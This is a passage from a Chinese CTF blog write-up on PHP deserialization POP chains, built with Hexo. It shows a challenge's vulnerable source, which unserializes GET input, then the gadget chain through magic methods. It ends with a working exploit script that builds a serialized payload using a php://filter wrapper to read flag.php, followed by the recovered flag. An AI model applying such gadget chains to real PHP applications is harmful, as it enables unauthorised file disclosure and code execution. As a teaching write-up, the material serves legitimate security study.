&#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>发现这一题的源码和上一题popchains非常像，可能上一题是这一题的改编题，那么我们类似上一题的流程构造pop链如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show::__wakeup()--&gt;Show::toString()--&gt;Test::__get()--&gt;Modifier::__invoke()</span><br></pre></td></tr></table></figure>
+<p>构造exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Show(&#x27;abc&#x27;);</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">$a-&gt;str-&gt;p = new Modifier();</span><br><span class="line">$b = new Show($a);</span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到base64加密flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezY2ZDBhMjJmLTQ5NGYtNDA5OC1hMzk5LWU5MjczMWMyZjM1Y30iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/03/31/pop%E9%93%BE/ha.png" alt></p>
+<p>解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    private $flag= &quot;flag&#123;66d0a22f-494f-4098-a399-e92731c2f35c&#125;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Help Me Find FLAG!&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="总结">总结</h4>
+<p>题目找的不多，后续还会补充。</p>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        <span class="nav-arrow">← </span>
+        
+          序列化与反序列化
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Utterances START -->
+      <div id="utterances"></div>
+      <script src="https://utteranc.es/client.js"
+        repo=""
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async></script>    
+      <!-- Utterances END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#pop%E9%93%BE%E7%AE%80%E4%BB%8B"><span class="toc-nav-text">pop链简介</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-nav-text">魔术方法</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E5%90%AB%E4%B9%89"><span class="toc-nav-text">反序列化字符含义</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E5%AE%9E%E4%BE%8B"><span class="toc-nav-text">题目实例</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#NISACTF-2022-babyserialize"><span class="toc-nav-text">[NISACTF 2022]babyserialize</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#NISACTF-2022-popchains"><span class="toc-nav-text">[NISACTF 2022]popchains</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#MRCTF2020-Ezpop"><span class="toc-nav-text">[MRCTF2020]Ezpop</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-text">总结</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2022/03/31/pop链/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
